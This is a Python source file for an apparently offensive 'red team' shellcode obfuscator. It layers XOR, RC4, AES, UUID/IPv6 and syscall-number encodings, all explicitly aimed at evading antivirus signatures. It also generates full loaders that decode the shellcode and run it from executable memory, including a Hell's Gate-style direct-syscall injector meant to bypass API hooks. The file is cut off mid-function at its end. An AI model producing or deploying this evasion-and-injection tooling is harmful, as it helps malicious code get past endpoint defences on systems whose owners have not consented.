#!/usr/bin/env python3
"""
Shellcode Obfuscator v3.0 — Red Team Utility
Purpose: Evade signature-based detection by transforming raw shellcode
         through multiple obfuscation layers, including encryption,
         printable encoding, and syscall obfuscation.

Dependencies for new features:
    pip install bcrypt cryptography

Usage:
    python3 obfuscator.py --shellcode "\\xfc\\xe8\\x82..." --techniques xor,bcrypt_aes,printable
    python3 obfuscator.py -f shellcode.bin -t all -o payload.py -m syscall
"""

import argparse
import base64
import hashlib
import os
import random
import string
import sys
from typing import List, Tuple, Optional, Any, Dict, Union

# Cryptographic imports (optional — checked at runtime)
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import bcrypt
    BCRYPT_AVAILABLE = True
except ImportError:
    BCRYPT_AVAILABLE = False


# ═════════════════════════════════════════════════════════════════════════════
#  ENCODING ENGINES
# ═════════════════════════════════════════════════════════════════════════════

# ── 1. XOR (single-byte & multi-byte) ──────────────────────────────────────

def encode_xor(sc: bytes, key: int = None) -> Tuple[bytes, int]:
    """XOR encode shellcode with a single-byte key."""
    key = key if key is not None else random.randint(1, 255)
    return bytes(b ^ key for b in sc), key


def encode_xor_multi(sc: bytes, key_len: int = 4) -> Tuple[bytes, bytes]:
    """XOR encode with a multi-byte repeating key."""
    key = bytes(random.randint(1, 255) for _ in range(key_len))
    encoded = bytes(sc[i] ^ key[i % key_len] for i in range(len(sc)))
    return encoded, key


# ── 2. Arithmetic transforms ───────────────────────────────────────────────

def encode_rot(sc: bytes, shift: int = None) -> Tuple[bytes, int]:
    """ADD/ROT encoding — adds a constant byte to each byte."""
    shift = shift if shift is not None else random.randint(1, 127)
    return bytes((b + shift) & 0xFF for b in sc), shift


def encode_sub(sc: bytes, shift: int = None) -> Tuple[bytes, int]:
    """SUB encoding — subtracts a constant byte from each byte."""
    shift = shift if shift is not None else random.randint(1, 127)
    return bytes((b - shift) & 0xFF for b in sc), shift


def encode_not(sc: bytes) -> Tuple[bytes, None]:
    """Bitwise NOT on each byte."""
    return bytes(~b & 0xFF for b in sc), None


# ── 3. S-Box substitution (AES-like) ───────────────────────────────────────

def encode_aes_placeholder(sc: bytes) -> Tuple[bytes, Tuple]:
    """
    Substitution-permutation with a randomly generated S-box.
    Not real AES — an SP-network for AV evasion.
    """
    seed = random.randint(0, 2**32 - 1)
    rng = random.Random(seed)
    sbox = list(range(256))
    rng.shuffle(sbox)

    subbed = bytes(sbox[b] for b in sc)
    key = bytes(rng.randint(1, 255) for _ in range(16))
    encoded = bytes(subbed[i] ^ key[i % 16] for i in range(len(subbed)))

    inv_sbox = [0] * 256
    for i, v in enumerate(sbox):
        inv_sbox[v] = i

    return encoded, (key, sbox, inv_sbox, seed)


# ── 4. Junk insertion ─────────────────────────────────────────────────────

def encode_insertion(sc: bytes, junk_char: bool = True) -> Tuple[bytes, int]:
    """Insert random junk bytes between each real byte."""
    result = bytearray()
    for b in sc:
        result.append(b)
        if junk_char:
            result.append(random.randint(0, 255))
        else:
            for _ in range(random.randint(1, 3)):
                result.append(random.randint(0, 255))
    return bytes(result), (1 if junk_char else random.randint(1, 3))


# ── 5. Interleave / shuffle ────────────────────────────────────────────────

def encode_split_interleave(sc: bytes, chunk_size: int = 2) -> bytes:
    """Split shellcode into N chunks and interleave them."""
    chunks = [sc[i::chunk_size] for i in range(chunk_size)]
    result = bytearray()
    max_len = max(len(c) for c in chunks)
    for i in range(max_len):
        for c in chunks:
            if i < len(c):
                result.append(c[i])
    return bytes(result)


# ── 6. UUID encoding ───────────────────────────────────────────────────────

def encode_uuid(sc: bytes) -> List[str]:
    """Encode shellcode as an array of UUID strings (16 bytes per UUID)."""
    remainder = len(sc) % 16
    if remainder:
        sc += b'\x90' * (16 - remainder)

    uuids = []
    for i in range(0, len(sc), 16):
        chunk = sc[i:i+16]
        hex_str = chunk.hex()
        uuid_str = f"{hex_str[0:8]}-{hex_str[8:12]}-{hex_str[12:16]}-{hex_str[16:20]}-{hex_str[20:32]}"
        uuids.append(uuid_str)
    return uuids


# ── 7. IPv6 encoding ──────────────────────────────────────────────────────

def encode_ipv6(sc: bytes) -> List[str]:
    """Encode shellcode as IPv6 address strings (16 bytes per address)."""
    remainder = len(sc) % 16
    if remainder:
        sc += b'\x90' * (16 - remainder)

    ips = []
    for i in range(0, len(sc), 16):
        chunk = sc[i:i+16]
        parts = ':'.join(f"{chunk[j]:02x}{chunk[j+1]:02x}" for j in range(0, 16, 2))
        ips.append(parts)
    return ips


# ── 8. Base64 & Hex ───────────────────────────────────────────────────────

def encode_base64(sc: bytes) -> str:
    """Standard base64 encoding."""
    return base64.b64encode(sc).decode()


def encode_hex_string(sc: bytes, separator: str = "\\x") -> str:
    """Hex string format."""
    if separator == "\\x":
        return ''.join(f"\\x{b:02x}" for b in sc)
    return sc.hex(separator)


# ═════════════════════════════════════════════════════════════════════════════
#  NEW TECHNIQUES (v3.0)
# ═════════════════════════════════════════════════════════════════════════════

# ── 9. RC4 Encryption ─────────────────────────────────────────────────────

def _rc4_ksa(key: bytes) -> List[int]:
    """RC4 Key-Scheduling Algorithm."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S


def _rc4_prga(S: List[int], length: int) -> bytes:
    """RC4 Pseudo-Random Generation Algorithm — produces keystream."""
    i = j = 0
    keystream = bytearray()
    for _ in range(length):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        keystream.append(S[(S[i] + S[j]) & 0xFF])
    return bytes(keystream)


def encode_rc4(sc: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
    """
    RC4 encrypt the shellcode.
    RC4 is symmetric — encryption and decryption are the same operation.
    Returns (ciphertext, rc4_key).
    """
    if key is None:
        key = os.urandom(16)  # 128-bit random key
    S = _rc4_ksa(key)
    keystream = _rc4_prga(S, len(sc))
    ciphertext = bytes(sc[i] ^ keystream[i] for i in range(len(sc)))
    return ciphertext, key


# ── 10. bcrypt-derived AES-256-CBC Encryption ─────────────────────────────

def encode_aes_bcrypt(sc: bytes, passphrase: str = None) -> Tuple[bytes, Tuple]:
    """
    Derive an AES-256 key from a bcrypt KDF and encrypt shellcode with AES-CBC.
    Returns (ciphertext, (salt, iv, passphrase)).
    """
    if not BCRYPT_AVAILABLE:
        raise ImportError("bcrypt library required. Install: pip install bcrypt")
    if not CRYPTO_AVAILABLE:
        raise ImportError("cryptography library required. Install: pip install cryptography")

    if passphrase is None:
        # Generate a random 32-char passphrase
        passphrase = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

    salt = bcrypt.gensalt(rounds=5)  # fast rounds for red-team use
    # Derive 32 bytes for AES-256
    derived_key = bcrypt.kdf(
        password=passphrase.encode(),
        salt=salt,
        desired_key_bytes=32,
        rounds=5,  # keep it fast
        ignore_few_rounds=True
    )

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
    encryptor = cipher.encryptor()

    # PKCS7 padding
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(sc) + padder.finalize()

    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    return ciphertext, (salt, iv, passphrase, derived_key)


# ── 11. Printable / Alphanumeric Encoding ──────────────────────────────────

def encode_printable(sc: bytes) -> Tuple[bytes, None]:
    """
    Encode shellcode as printable ASCII characters only (0x21-0x7e).
    Uses nibble splitting: each byte -> 2 printable chars.
    The decoder reconstructs original bytes at runtime.
    Returns encoded bytes (as ASCII string bytes), None.

    Mapping: nibble value (0-15) -> char in "PQRSTUVWXYZ012345" (printable range)
    """
    # Use a charset that covers all 16 nibble values with printable chars
    # that are also safe for C strings and Python strings
    nibble_chars = b'PQRSTUVWXYZabcdef'  # 16 printable chars

    result = bytearray()
    for b in sc:
        high = (b >> 4) & 0x0F
        low = b & 0x0F
        result.append(nibble_chars[high])
        result.append(nibble_chars[low])

    return bytes(result), nibble_chars


# ── 12. Syscall Number Obfuscation ────────────────────────────────────────

def encode_syscall_obfuscation(sc: bytes, xor_key: int = None) -> Tuple[bytes, int]:
    """
    Scans x64 shellcode for syscall instructions (0x0f 0x05) and obfuscates
    the preceding syscall-number move instruction's immediate value.

    Targets patterns:
      - B8 xx xx xx xx 0F 05   (mov eax, imm32; syscall)
      - 48 B8 xx xx xx xx xx xx xx xx 0F 05  (mov rax, imm64; syscall)
      - B8 xx xx xx xx 41 FF ?? 0F 05 (mov eax, imm32; ...; syscall)

    Falls back to XOR-encoding the 0F 05 bytes themselves if no obvious
    mov pattern is found within 16 bytes preceding.
    """
    if xor_key is None:
        xor_key = random.randint(1, 255)

    sc_bytes = bytearray(sc)

    i = 0
    while i < len(sc_bytes) - 1:
        if sc_bytes[i] == 0x0F and sc_bytes[i+1] == 0x05:
            # Found syscall — look backwards for mov eax/rax
            found_mov = False
            # Search up to 20 bytes back
            for j in range(max(0, i - 20), i):
                # mov eax, imm32: B8 xx xx xx xx (5 bytes)
                if sc_bytes[j] == 0xB8 and i - j == 5:
                    # XOR the immediate value
                    for k in range(j+1, j+5):
                        sc_bytes[k] ^= xor_key
                    found_mov = True
                    break
                # mov rax, imm64: 48 B8 xx xx xx xx xx xx xx xx (10 bytes)
                if (j < len(sc_bytes) - 9 and
                    sc_bytes[j] == 0x48 and sc_bytes[j+1] == 0xB8 and
                    i - j == 10):
                    for k in range(j+2, j+10):
                        sc_bytes[k] ^= xor_key
                    found_mov = True
                    break

            if not found_mov:
                # Fallback: XOR the 0F 05 bytes themselves
                sc_bytes[i] ^= xor_key
                sc_bytes[i+1] ^= xor_key

            # Skip past this syscall
            i += 2
        else:
            i += 1

    return bytes(sc_bytes), xor_key


# ═════════════════════════════════════════════════════════════════════════════
#  DECODER STUB GENERATORS
# ═════════════════════════════════════════════════════════════════════════════

def gen_decoder_xor(key: int, var_name: str = "buf") -> str:
    return f"""# XOR decoder (key=0x{key:02x})
for i in range(len({var_name})):
    {var_name}[i] ^= 0x{key:02x}
"""


def gen_decoder_xor_multi(key: bytes, var_name: str = "buf") -> str:
    key_bytes = ', '.join(f"0x{b:02x}" for b in key)
    key_len = len(key)
    return f"""# Multi-byte XOR decoder (key_len={key_len})
key = [{key_bytes}]
for i in range(len({var_name})):
    {var_name}[i] ^= key[i % {key_len}]
"""


def gen_decoder_rot(shift: int, var_name: str = "buf") -> str:
    return f"""# ROT decoder (subtract {shift})
for i in range(len({var_name})):
    {var_name}[i] = ({var_name}[i] - {shift}) & 0xFF
"""


def gen_decoder_sub(shift: int, var_name: str = "buf") -> str:
    return f"""# ADD decoder (add {shift} back)
for i in range(len({var_name})):
    {var_name}[i] = ({var_name}[i] + {shift}) & 0xFF
"""


def gen_decoder_not(var_name: str = "buf") -> str:
    return f"""# NOT decoder
for i in range(len({var_name})):
    {var_name}[i] ^= 0xFF
"""


def gen_decoder_insertion(step: int, var_name: str = "buf") -> str:
    return f"""# Insertion decoder (strip junk bytes)
buf_clean = bytearray()
for i in range(0, len({var_name}), 2):
    buf_clean.append({var_name}[i])
{var_name} = buf_clean
"""


def gen_decoder_aes(key: bytes, sbox: List[int], inv_sbox: List[int], var_name: str = "buf") -> str:
    return f"""# S-box decoder (reverse substitution + XOR)
key = [{', '.join(f'0x{b:02x}' for b in key)}]
inv_sbox = {inv_sbox}
for i in range(len({var_name})):
    {var_name}[i] ^= key[i % 16]
    {var_name}[i] = inv_sbox[{var_name}[i]]
"""


def gen_decoder_uuid(var_name: str = "buf") -> str:
    return f"""# UUID decoder
import uuid
{var_name} = bytearray()
for u in uuids:
    {var_name}.extend(uuid.UUID(u).bytes)
"""


def gen_decoder_ipv6(var_name: str = "buf") -> str:
    return f"""# IPv6 decoder
import ipaddress
{var_name} = bytearray()
for ip_str in ip_addresses:
    {var_name}.extend(ipaddress.IPv6Address(ip_str).packed)
"""


def gen_decoder_base64(var_name: str = "buf") -> str:
    return f"""# Base64 decoder
import base64
{var_name} = bytearray(base64.b64decode(encoded_b64))
"""


# ── NEW: RC4 decoder ─────────────────────────────────────────────────────

def gen_decoder_rc4(key: bytes, var_name: str = "buf") -> str:
    key_bytes = ', '.join(f'0x{b:02x}' for b in key)
    return f"""# RC4 decoder (symmetric — same operation as encryption)
key = [{key_bytes}]
# RC4 KSA
S = list(range(256))
j = 0
for i in range(256):
    j = (j + S[i] + key[i % len(key)]) & 0xFF
    S[i], S[j] = S[j], S[i]
# RC4 PRGA
i = j = 0
decrypted = bytearray()
for byte in {var_name}:
    i = (i + 1) & 0xFF
    j = (j + S[i]) & 0xFF
    S[i], S[j] = S[j], S[i]
    K = S[(S[i] + S[j]) & 0xFF]
    decrypted.append(byte ^ K)
{var_name} = decrypted
"""


# ── NEW: bcrypt-AES decoder ──────────────────────────────────────────────

def gen_decoder_aes_bcrypt(salt: bytes, iv: bytes, passphrase: str,
                            var_name: str = "buf") -> str:
    salt_b64 = base64.b64encode(salt).decode()
    iv_hex = iv.hex()
    return f"""# bcrypt-AES-256-CBC decoder
import base64, bcrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

salt = base64.b64decode("{salt_b64}")
iv = bytes.fromhex("{iv_hex}")
passphrase = "{passphrase}"

# Derive key (same params as encoder)
derived_key = bcrypt.kdf(
    password=passphrase.encode(),
    salt=salt,
    desired_key_bytes=32,
    rounds=5,
    ignore_few_rounds=True
)

# Decrypt
cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
decryptor = cipher.decryptor()
padded = decryptor.update({var_name}) + decryptor.finalize()

# Unpad PKCS7
unpadder = padding.PKCS7(128).unpadder()
{var_name} = bytearray(unpadder.update(padded) + unpadder.finalize())
"""


# ── NEW: Printable decoder ───────────────────────────────────────────────

def gen_decoder_printable(nibble_chars: bytes, var_name: str = "buf") -> str:
    # Build reverse mapping
    rev_map = {}
    for i, c in enumerate(nibble_chars):
        rev_map[chr(c)] = i
    return f"""# Printable/alphanumeric decoder
nibble_map = {rev_map}
decoded = bytearray()
for i in range(0, len({var_name}), 2):
    high = nibble_map[chr({var_name}[i])]
    low = nibble_map[chr({var_name}[i+1])]
    decoded.append((high << 4) | low)
{var_name} = decoded
"""


# ── NEW: Syscall obfuscation decoder ─────────────────────────────────────

def gen_decoder_syscall(key: int, var_name: str = "buf") -> str:
    return f"""# Syscall number de-obfuscator (XOR key=0x{key:02x})
# Scans for encoded syscall patterns and restores them
key = 0x{key:02x}
i = 0
while i < len({var_name}) - 1:
    # Check if this might be an obfuscated syscall point
    # Decode and check for 0F 05 pattern
    b0 = {var_name}[i] ^ key if {var_name}[i] != 0x0F else {var_name}[i]
    b1 = {var_name}[i+1] ^ key if {var_name}[i+1] != 0x05 else {var_name}[i+1]
    
    if (b0 == 0x0F and b1 == 0x05) or ({var_name}[i] == 0x0F and {var_name}[i+1] == 0x05):
        # Found syscall — restore immediate values before it
        for j in range(max(0, i - 20), i):
            # Try to find mov eax (0xB8) or mov rax (0x48 0xB8)
            if {var_name}[j] == 0xB8:
                # Check if this looks XOR-corrupted
                for k in range(j+1, min(j+5, len({var_name}))):
                    {var_name}[k] ^= key
                break
            if j < len({var_name}) - 1 and {var_name}[j] == 0x48 and {var_name}[j+1] == 0xB8:
                for k in range(j+2, min(j+10, len({var_name}))):
                    {var_name}[k] ^= key
                break
        # Restore syscall bytes if they were XOR'd
        if {var_name}[i] != 0x0F:
            {var_name}[i] ^= key
        if {var_name}[i+1] != 0x05:
            {var_name}[i+1] ^= key
        i += 2
    else:
        i += 1
"""


# ═════════════════════════════════════════════════════════════════════════════
#  EXECUTION METHOD — SYSCALL-BASED INJECTION
# ═════════════════════════════════════════════════════════════════════════════

def gen_execution_syscall(var_name: str = "buf") -> str:
    """
    Generate Python code that uses direct x64 syscalls for memory allocation
    and execution, bypassing Win32 API hooks.

    Syscalls used (x64 Windows):
      - NtAllocateVirtualMemory  (syscall 0x18 on Win10 20H1+, varies by build)
      - NtWriteVirtualMemory     (syscall 0x3A)
      - NtCreateThreadEx         (syscall 0xC2)

    NOTE: Syscall numbers change between Windows builds. This uses dynamic
    resolution via reading the stub from ntdll.dll (Hell's Gate style).
    """
    return f"""# ── Syscall-based execution (Hell's Gate style) ──
import ctypes, ctypes.wintypes
from ctypes import wintypes

# --- Dynamic syscall resolution (Hell's Gate) ---
ntdll = ctypes.windll.ntdll

def get_syscall_number(func_name):
    '''Extract syscall number from ntdll stub (Hell's Gate).'''
    addr = ctypes.cast(getattr(ntdll, func_name), ctypes.c_void_p).value
    if not addr:
        raise Exception(f"Could not resolve {{func_name}}")
    # Read bytes from the stub
    buf = (ctypes.c_ubyte * 32).from_address(addr)
    # Look for: mov eax, SSN (B8 XX XX XX XX) or mov r10,rcx; mov eax, SSN
    for i in range(24):
        if buf[i] == 0xB8:  # mov eax, imm32
            return buf[i+1] | (buf[i+2] << 8) | (buf[i+3] << 16) | (buf[i+4] << 24)
        if i < 22 and buf[i] == 0x4C and buf[i+1] == 0x8B and buf[i+2] == 0xD1 and buf[i+3] == 0xB8:
            # mov r10, rcx; mov eax, SSN
            if i + 8 < 32 and buf[i+4] == 0xB8:
                return buf[i+5] | (buf[i+6] << 8) | (buf[i+7] << 16) | (buf[i+8] << 24)
    raise Exception(f"Cannot find syscall number for {{func_name}}")

# Resolve syscall numbers from ntdll
syscall_NtAllocateVirtualMemory = get_syscall_number('NtAllocateVirtualMemory')
syscall_NtWriteVirtualMemory = get_syscall_number('NtWriteVirtualMemory')
syscall_NtCreateThreadEx = get_syscall_number('NtCreateThreadEx')

# --- Helper: perform a syscall ---
def syscall_invoke(ssn, args_ptr, arg_count):
    '''
    Inline assembly to invoke a syscall by SSN.
    Uses a simple syscall stub from allocated executable memory.
    '''
    # Shellcode stub: given SSN in r10, arguments in a struct, performs syscall
    syscall_stub = (
        b"\\x4C\\x8B\\xD1"          # mov r10, rcx       ; rcx = args pointer
        b"\\x4D\\x8B\\x02"          # mov r8, [r10]      ; r8d = SSN at offset 0
        b"\\x4C\\x89\\x04\\x24"     # mov [rsp], r8     
        b"\\x58"                    # pop rax            ; rax = SSN
        b"\\x49\\x8B\\x4A\\x08"     # mov rcx, [r10+8]   ; arg1
        b"\\x49\\x8B\\x52\\x10"     # mov rdx, [r10+16]  ; arg2
        b"\\x4D\\x8B\\x42\\x18"     # mov r8, [r10+24]   ; arg3
        b"\\x4D\\x8B\\x4A\\x20"     # mov r9, [r10+32]   ; arg4
        b"\\x0F\\x05"              # syscall
        b"\\xC3"                   # ret
    )
    
    size = len(syscall_stub)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        None, size, 0x1000, 0x40
    )
    ctypes.windll.kernel32.RtlMoveMemory(ptr, syscall_stub, size)
    
    stub_fn = ctypes.CFUNCTYPE(ctypes.c_uint64, ctypes.c_void_p)(ptr)
    return stub_fn(args_ptr)

# --- Allocate memory via syscall ---
alloc_size = ctypes.c_uint64(len({var_name}))
alloc_handle = ctypes.c_void_p(-1)  # Current process
alloc_base = ctypes.c_void_p(0)
alloc_region = ctypes.pointer(alloc_base)
alloc_region_size = ctypes.pointer(alloc_size)

# Pack args for NtAllocateVirtualMemory
# SSN | Handle | RegionPtr | ZeroBits | SizePtr | AllocationType | Protect
class NtAllocateArgs(ctypes.Structure):
    _fields_ = [
        ("ssn", ctypes.c_uint32),
        ("handle", ctypes.c_void_p),
        ("base", ctypes.POINTER(ctypes.c_void_p)),
        ("zero_bits", ctypes.c_uint64),
        ("size", ctypes.POINTER(ctypes.c_uint64)),
        ("alloc_type", ctypes.c_uint32),
        ("protect", ctypes.c_uint32),
    ]

args1 = NtAllocateArgs()
args1.ssn = syscall_NtAllocateVirtualMemory
args1.handle = ctypes.c_void_p(-1)  # NtCurrentProcess()
args1.base = alloc_region
args1.zero_bits = 0
args1.size = alloc_region_size
args1.alloc_type = 0x1000 | 0x2000  # MEM_COMMIT | MEM_RESERVE
args1.protect = 0x40  # PAGE_EXECUTE_READWRITE

result = syscall_invoke(syscall_NtAllocateVirtualMemory, ctypes.pointer(args1), 7)
if result != 0:
    # Fallback: use standard VirtualAlloc
    shellcode_addr = ctypes.windll.kernel32.VirtualAlloc(
        None, len({var_name}), 0x1000 | 0x2000, 0x40
    )
else:
    shellcode_addr = ctypes.cast(alloc_base, ctypes.c_void_p).value

# --- Write shellcode ---
ctypes.windll.kernel32.RtlMoveMemory(shellcode_addr, bytes({var_name}), len({var_name}))

# --- Execute ---
ctypes.CFUNCTYPE(ctypes.c_void_p)(shellcode_addr)()
"""


# ═════════════════════════════════════════════════════════════════════════════
#  MAIN OBFUSCATOR CLASS
# ═════════════════════════════════════════════════════════════════════════════

class ShellcodeObfuscator:
    """Multi-technique shellcode obfuscator with decoder generation."""

    TECHNIQUES: Dict[str, tuple] = {
        # Original techniques
        'xor':        (encode_xor,         gen_decoder_xor,         "Single-byte XOR"),
        'xor_multi':  (encode_xor_multi,   gen_decoder_xor_multi,   "Multi-byte XOR"),
        'rot':        (encode_rot,         gen_decoder_rot,         "ADD/ROT shift"),
        'sub':        (encode_sub,         gen_decoder_sub,         "SUB shift"),
        'not':        (encode_not,         gen_decoder_not,         "Bitwise NOT"),
        'aes_like':   (encode_aes_placeholder, gen_decoder_aes,     "S-Box substitution + XOR"),
        'insertion':  (encode_insertion,   gen_decoder_insertion,   "Junk byte insertion"),
        'base64':     (encode_base64,      gen_decoder_base64,      "Base64 encoding"),
        'uuid':       (encode_uuid,        gen_decoder_uuid,        "UUID string encoding"),
        'ipv6':       (encode_ipv6,        gen_decoder_ipv6,        "IPv6 address encoding"),
        # New techniques (v3.0)
        'rc4':        (encode_rc4,         gen_decoder_rc4,         "RC4 stream cipher encryption"),
        'bcrypt_aes': (encode_aes_bcrypt,  gen_decoder_aes_bcrypt,  "bcrypt-derived AES-256-CBC encryption"),
        'printable':  (encode_printable,   gen_decoder_printable,   "Printable/alphanumeric encoding"),
        'syscall_obf':(encode_syscall_obfuscation, gen_decoder_syscall, "Syscall number obfuscation"),
    }

    def __init__(self, shellcode: bytes):
        self.shellcode = shellcode
        self.history: List[dict] = []

    def apply(self, technique: str, **kwargs) -> dict:
        """Apply a single obfuscation technique and return metadata."""
        if technique not in self.TECHNIQUES:
            raise ValueError(
                f"Unknown technique: {technique}. "
                f"Available: {list(self.TECHNIQUES.keys())}"
            )

        encode_fn, decode_fn, desc = self.TECHNIQUES[technique]
        metadata: Dict[str, Any] = {
            'technique': technique,
            'description': desc,
        }

        # ── Dispatch to specific encoders ──
        if technique == 'xor':
            encoded, key = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'key': key, 'size': len(encoded),
                             'decoder_stub': decode_fn(key)})

        elif technique == 'xor_multi':
            encoded, key = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'key': key, 'size': len(encoded),
                             'decoder_stub': decode_fn(key)})

        elif technique == 'rot':
            encoded, shift = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'shift': shift, 'size': len(encoded),
                             'decoder_stub': decode_fn(shift)})

        elif technique == 'sub':
            encoded, shift = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'shift': shift, 'size': len(encoded),
                             'decoder_stub': decode_fn(shift)})

        elif technique == 'not':
            encoded, _ = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'size': len(encoded),
                             'decoder_stub': decode_fn()})

        elif technique == 'aes_like':
            encoded, aux = encode_fn(self.shellcode)
            key, sbox, inv_sbox, seed = aux
            metadata.update({'encoded': encoded, 'key': key, 'sbox': sbox,
                             'inv_sbox': inv_sbox, 'seed': seed, 'size': len(encoded),
                             'decoder_stub': decode_fn(key, sbox, inv_sbox)})

        elif technique == 'insertion':
            encoded, step = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'step': step, 'size': len(encoded),
                             'decoder_stub': decode_fn(step)})

        elif technique == 'base64':
            encoded = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'size': len(encoded),
                             'decoder_stub': decode_fn()})

        elif technique == 'uuid':
            encoded = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'size': len(str(encoded)),
                             'decoder_stub': decode_fn()})

        elif technique == 'ipv6':
            encoded = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'size': len(str(encoded)),
                             'decoder_stub': decode_fn()})

        # ── New techniques ──
        elif technique == 'rc4':
            encoded, key = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'key': key, 'size': len(encoded),
                             'decoder_stub': decode_fn(key)})

        elif technique == 'bcrypt_aes':
            encoded, aux = encode_fn(self.shellcode, **kwargs)
            salt, iv, passphrase, derived_key = aux
            metadata.update({'encoded': encoded, 'salt': salt, 'iv': iv,
                             'passphrase': passphrase, 'derived_key': derived_key,
                             'size': len(encoded),
                             'decoder_stub': decode_fn(salt, iv, passphrase)})

        elif technique == 'printable':
            encoded, nibble_chars = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'nibble_chars': nibble_chars,
                             'size': len(encoded),
                             'decoder_stub': decode_fn(nibble_chars)})

        elif technique == 'syscall_obf':
            encoded, key = encode_fn(self.shellcode)
            metadata.update({'encoded': encoded, 'key': key, 'size': len(encoded),
                             'decoder_stub': decode_fn(key)})

        else:
            raise ValueError(f"Unhandled technique: {technique}")

        self.history.append(metadata)
        return metadata

    def apply_chain(self, techniques: List[str], **kwargs) -> List[dict]:
        """Apply a chain of techniques sequentially, feeding output as new input."""
        results = []
        for tech in techniques:
            # Pass kwargs only to bcrypt_aes (which needs passphrase)
            tech_kwargs = {}
            if tech == 'bcrypt_aes' and 'passphrase' in kwargs:
                tech_kwargs['passphrase'] = kwargs['passphrase']

            meta = self.apply(tech, **tech_kwargs)
            results.append(meta)

            # Feed encoded output as new shellcode for chaining
            encoded = meta['encoded']
            if isinstance(encoded, list):
                if meta['technique'] == 'uuid':
                    import uuid
                    raw = bytearray()
                    for u_str in encoded:
                        raw.extend(uuid.UUID(u_str).bytes)
                    self.shellcode = bytes(raw)
                elif meta['technique'] == 'ipv6':
                    import ipaddress
                    raw = bytearray()
                    for ip_str in encoded:
                        raw.extend(ipaddress.IPv6Address(ip_str).packed)
                    self.shellcode = bytes(raw)
            elif isinstance(encoded, str):
                if meta['technique'] == 'base64':
                    self.shellcode = base64.b64decode(encoded)
                else:
                    self.shellcode = encoded.encode('latin-1')
            else:
                self.shellcode = encoded

        return results

    def generate_payload_python(self, techniques: List[str],
                                 output_file: str = None,
                                 execution_method: str = 'ctypes',
                                 passphrase: str = None) -> str:
        """
        Generate a complete Python payload with decoder stubs and execution.

        execution_method options:
          - 'ctypes'  : Standard Win32 API calls via ctypes (Windows)
          - 'mmap'    : mmap-based execution (Linux/OSX)
          - 'syscall' : Direct syscall injection via Hell's Gate (Windows x64)
        """
        results = self.apply_chain(techniques, passphrase=passphrase)

        lines = []
        lines.append('#!/usr/bin/env python3')
        lines.append('# Shellcode Obfuscated Payload')
        lines.append(f'# Techniques: {", ".join(techniques)}')
        lines.append(f'# Original size: {len(self.shellcode)} bytes')
        lines.append(f'# SHA256: {hashlib.sha256(self.shellcode).hexdigest()}')
        lines.append('')
        lines.append('import sys')
        lines.append('')

        # ── Embedded encoded payload ──
        last_meta = results[-1]
        last_tech = last_meta['technique']

        if last_tech == 'uuid':
            lines.append('# Encoded as UUID strings')
            lines.append('uuids = [')
            for u in last_meta['encoded']:
                lines.append(f'    "{u}",')
            lines.append(']')
            lines.append('')
        elif last_tech == 'ipv6':
            lines.append('# Encoded as IPv6 addresses')
            lines.append('ip_addresses = [')
            for ip in last_meta['encoded']:
                lines.append(f'    "{ip}",')
            lines.append(']')
            lines.append('')
        elif last_tech == 'base64':
            lines.append('# Base64 encoded shellcode')
            lines.append(f'encoded_b64 = "{last_meta["encoded"]}"')
            lines.append('')
        elif last_tech == 'printable':
            lines.append('# Printable/alphanumeric encoded shellcode')
            encoded_str = last_meta['encoded'].decode('ascii')
            lines.append(f'buf = bytearray("{encoded_str}", "ascii")')
            lines.append('')
        elif last_tech == 'bcrypt_aes':
            # Store ciphertext as hex
            ct_hex = last_meta['encoded'].hex()
            lines.append('# AES-CBC encrypted shellcode (hex)')
            lines.append(f'buf = bytearray.fromhex("{ct_hex}")')
            lines.append('')
        else:
            lines.append('# Encoded shellcode bytes')
            encoded = last_meta['encoded']
            if isinstance(encoded, bytes):
                hex_bytes = ', '.join(f'0x{b:02x}' for b in encoded)
                lines.append(f'buf = bytearray([{hex_bytes}])')
                lines.append('')

        # ── Decoder stubs (applied in reverse order) ──
        lines.append('# ── Decoder stubs (reverse order) ──')
        for meta in reversed(results):
            decoder = meta['decoder_stub']
            lines.append(decoder)
            lines.append('')

        # ── Execution ──
        lines.append('# ── Execution ──')

        if execution_method == 'syscall':
            syscall_code = gen_execution_syscall()
            lines.append(syscall_code)
        elif execution_method == 'ctypes':
            lines.append('import ctypes')
            lines.append('')
            lines.append('# Allocate RWX memory')
            lines.append('ptr = ctypes.windll.kernel32.VirtualAlloc(')
            lines.append('    None,')
            lines.append('    len(buf),')
            lines.append('    0x1000,  # MEM_COMMIT')
            lines.append('    0x40     # PAGE_EXECUTE_READWRITE')
            lines.append(')')
            lines.append('')
            lines.append('# Copy shellcode to allocated memory')
            lines.append('ctypes.windll.kernel32.RtlMoveMemory(')
            lines.append('    ptr,')
            lines.append('    (ctypes.c_char * len(buf)).from_buffer(buf),')
            lines.append('    len(buf)')
            lines.append(')')
            lines.append('')
            lines.append('# Execute')
            lines.append('ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)()')
        elif execution_method == 'mmap':
            lines.append('import mmap')
